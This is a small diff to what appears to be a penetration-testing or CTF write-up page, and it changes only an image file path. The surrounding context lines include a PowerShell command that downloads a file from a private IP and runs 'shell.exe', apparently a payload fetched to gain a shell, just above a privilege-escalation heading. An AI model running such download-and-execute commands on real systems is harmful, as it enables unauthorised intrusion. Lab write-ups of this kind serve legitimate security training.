@@ -82,7 +82,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:81
 Start-Process "shell.exe"
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Privilege Escalation**
 
